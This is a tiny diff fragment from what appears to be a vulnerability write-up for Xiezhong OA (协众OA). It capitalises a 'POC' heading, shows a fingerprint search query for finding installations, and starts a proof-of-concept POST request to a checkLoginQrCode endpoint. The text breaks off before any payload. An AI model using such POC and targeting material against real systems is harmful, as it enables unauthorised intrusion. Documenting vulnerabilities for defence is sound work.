@@ -7,7 +7,7 @@
 app="协众软件-协众OA"
 ```
 
-## poc
+## POC
 ```javascript
 POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
 Host: 
